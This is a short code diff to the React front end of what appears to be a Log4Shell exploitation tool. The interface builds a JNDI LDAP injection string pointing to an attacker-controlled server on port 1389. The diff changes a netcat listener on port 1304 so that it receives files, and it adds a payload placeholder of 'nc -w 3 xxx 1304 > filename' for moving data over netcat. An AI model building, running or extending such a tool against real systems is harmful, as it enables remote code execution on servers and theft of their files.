@@ -129,10 +129,7 @@ const HomePage = () => {
                 break;
             case 'startNcat':
                 const ncatResult = await startNcat(state.filename);
-                newConsoleLog += ncatResult.error ? ncatResult.error : ncatResult.message;
-                break;
-            case 'setNcatFilename':
-                setState((prevState) => ({ ...prevState, filename: state.filename }));
+                newConsoleLog += ncatResult.error ? ncatResult.error : ncatResult.message + state.filename;
                 break;
             case 'stopNcat':
                 const stopNcatResult = await stopNcat();
@@ -168,7 +165,7 @@ const HomePage = () => {
                         </InputRightElement>
                     </InputGroup>
                     <InputGroup size='md' mt={4}>
-                        <InputLeftAddon>nc -l -p 1304 &lt; </InputLeftAddon>
+                        <InputLeftAddon>nc -l -p 1304 &gt; </InputLeftAddon>
                         <Input
                             pr='4.5rem'
                             placeholder='Filename'
@@ -192,7 +189,7 @@ const HomePage = () => {
                         <InputLeftAddon>&#123;jdni:ldap://{state.intIP}:1389/Basic/Command/Base64/</InputLeftAddon>
                         <Input
                             pr='4.5rem'
-                            placeholder='Payload'
+                            placeholder='nc -w 3 xxx 1304 &gt; filename'
                             value={state.payload}
                             onChange={(e) => setState((prevState) => ({ ...prevState, payload: e.target.value }))}
                         />
